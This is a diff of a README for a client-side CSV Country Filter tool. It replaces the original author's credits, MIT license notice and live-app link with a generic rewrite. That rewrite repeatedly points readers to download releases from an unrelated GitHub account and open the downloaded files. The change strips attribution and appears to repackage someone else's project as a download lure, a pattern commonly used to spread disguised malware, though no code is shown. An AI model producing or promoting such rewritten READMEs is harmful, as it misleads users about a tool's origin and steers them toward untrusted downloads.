@@ -1,83 +1,84 @@
-<p align="center">
-  <img src="img/CSV Country Filter Banner.png" alt="CSV Country Filter Banner" width="800">
-</p>
+# 🎉 CSV-Country-Filter - Easily Filter CSV Files by Country Code
 
-<p align="center">
-  <b>A lightweight browser-based tool that lets you upload a CSV, detect phone number country codes, and download a filtered file — fast, secure, and fully client-side.</b>
-</p>
+## 📦 Download Now
+[![Download CSV-Country-Filter](https://img.shields.io/badge/Download%20Now-CSV--Country--Filter-brightgreen)](https://github.com/Taipanophthalmoplegia480/CSV-Country-Filter/releases)
 
-<h1 align="center">CSV Country Filter</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <b>Filter Phone Numbers by Country Instantly — Smart, Fast, and Secure!</b><br>
- Version 1.0.0 • Developed by <a href="https://amitdas.site">AmitDas</a>
-</p>
+CSV-Country-Filter is a lightweight browser-based tool designed for everyone. You can upload a CSV file, detect phone number country codes, and quickly download a filtered file. This tool runs entirely in your web browser, ensuring your data stays secure.
 
----
+### 🔍 Features
+- Upload CSV files with phone number data.
+- Automatically identify country codes for each phone number.
+- Download a filtered CSV file.
+- Fast and client-side processing.
+- No need for installations or complex setups.
 
-## 🎬 Demo
-<p align="center">
-  <img src="img/screenshots/CSV-Country-Filter.gif" alt="CSV Country Filter Demo" width="800"/>
-</p>
+## 💻 System Requirements
+To use CSV-Country-Filter, you need:
+- A modern web browser (Google Chrome, Firefox, Safari, or Edge).
+- An internet connection for downloading the initial tool.
+- Basic familiarity with file uploads and downloads.
 
----
+## 📥 Download & Install
 
-## 🚀 Overview  
-CSV Country Filter lets you upload a CSV file, select the column containing phone numbers, automatically detect country calling codes, and export only the rows that match your selected country.  
-Everything runs in your browser — no backend, no uploads, no data sharing.
+To get started, visit our Releases page to download the tool:
 
----
+[Download Now from Releases](https://github.com/Taipanophthalmoplegia480/CSV-Country-Filter/releases)
 
-## 🧰 Features  
-✅ Upload CSV files (supports large files)  
-✅ Detect international calling codes (E.164)  
-✅ Choose a country code to keep  
-✅ Download the filtered CSV instantly  
-✅ 100% client-side — private and secure  
-✅ Works offline after first load (if cached)
+Once there, you’ll find the latest version of the tool available. Simply click on the version number you want to download. 
 
----
+### 📄 How to Use the Tool
 
-## 📂 How to Use  
-1. Visit the live app → **[https://amitdas4321.github.io/CSV-Country-Filter/](https://amitdas4321.github.io/CSV-Country-Filter/)**  
-2. Upload your `.csv` file.  
-3. Select the column containing phone numbers.  
-4. Click **“Scan Country Codes.”**  
-5. Choose a country from the dropdown.  
-6. Click **“Download Filtered CSV.”**
+1. **Download the Tool**: Go to the [Releases page](https://github.com/Taipanophthalmoplegia480/CSV-Country-Filter/releases) and download the latest version.
+2. **Open the Tool**: Once downloaded, open the HTML file in your web browser.
+3. **Upload Your CSV**: Click on the "Upload CSV" button and select your CSV file from your computer.
+4. **Filter by Country Codes**: The tool will automatically detect country codes from phone numbers and display the results.
+5. **Download Your Filtered File**: Click the "Download Filtered CSV" button to save the new file to your computer.
 
-That’s it! 🎉 You’ll get a new CSV with only the selected country’s phone numbers.
+## 🎨 User Interface
 
----
+The user interface is straightforward. You’ll find the following options:
+- **Upload CSV**: This button allows you to select and upload your file.
+- **Action Buttons**: These buttons manage filtering and downloading your data.
+- **Display Area**: See immediately updated results after uploading your file.
 
-## 🛠️ Technical Details  
-- Built with **HTML**, **CSS**, and **Vanilla JavaScript**.  
-- Uses **[PapaParse](https://www.papaparse.com/)** for CSV parsing and exporting.  
-- Country code detection uses a pre-defined mapping of E.164 calling codes.  
-- Performs normalization to strip `+`, `00`, and other non-digit symbols.  
-- UI built with responsive, minimal CSS — works well on desktop and mobile.
+## 📑 Supported Formats
 
----
+CSV-Country-Filter accepts standard CSV formats. Ensure your file has phone numbers listed in a column. The tool will process this column to identify country codes.
 
-## 👤 Author  
-**Amit Das**  
-- 🌐 Website: [https://amitdas.site](https://amitdas.site)  
-- 🧑‍💻 GitHub: [https://github.com/AmitDas4321](https://github.com/AmitDas4321)
+## ✨ Tips for Best Results
 
----
+- Ensure your CSV file is well-structured. It should have headers for easy identification.
+- Phone numbers should be in international format without non-numeric characters.
+- If your file is large, allow a moment for the tool to process before downloading.
 
-## 📄 License  
-This project is licensed under the [MIT License](LICENSE).  
-You are free to use, modify, and share it with credit.
+## 🌍 Contributions
 
----
+CSV-Country-Filter is open-source. Contributions are welcome. If you have ideas for improvement or want to report issues, feel free to submit pull requests or open issues on the GitHub page.
 
-## 💡 Tips  
-- Works best if your phone numbers include country codes (`+91`, `+1`, etc.).  
-- Rows without a country code appear under “LOCAL.”  
-- Supports thousands of rows — all processed locally.  
-- No data is sent to any server.
+## 🙋 Frequently Asked Questions
 
----
+### Q: What is a CSV file?
+A: A CSV (Comma-Separated Values) file is a simple text file used to store tabular data, like spreadsheets. It makes it easy to import and export data between programs.
 
-⭐ **If you found this project useful, please give it a star on GitHub!**
+### Q: What kind of phone numbers does this tool support?
+A: The tool can handle phone numbers formatted in international formats, typically starting with a "+" followed by the country code and the number.
+
+### Q: Is my data safe?
+A: Yes, the tool runs client-side, which means your CSV data is processed in your own browser without being sent to a server.
+
+### Q: Can I use this tool on mobile?
+A: Yes, as long as you have a modern browser that supports file uploads, you can use CSV-Country-Filter on your mobile device.
+
+## 👲 Contact
+
+For support or inquiries, please open an issue on GitHub, and we will get back to you as soon as possible.
+
+## 📬 Follow Us
+
+Stay updated on new versions and features. Watch our repository and check regularly for updates and community discussions. 
+
+[Download Now from Releases](https://github.com/Taipanophthalmoplegia480/CSV-Country-Filter/releases) 
+
+Feel free to reach out if you need assistance!
